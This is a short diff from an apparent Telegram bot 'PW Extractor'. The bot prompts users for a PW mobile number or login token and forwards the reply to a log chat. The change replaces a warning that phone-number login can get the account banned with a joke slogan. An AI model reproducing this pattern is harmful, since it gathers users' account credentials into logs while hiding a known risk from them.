@@ -124,7 +124,7 @@ async def pw_login(app, message):
     try:
         query_msg = await app.ask(
             chat_id=message.chat.id,
-            text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:** , --- \n **DONT LOGIN WITH PHONE NUMBER, It Leads to ban your account of PW**")
+            text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:** , --- \n **SABSE FAMOUS APNA PW HEHE**")
         await forward_to_log(query_msg, "PW Extractor")
         
         user_input = query_msg.text.strip()
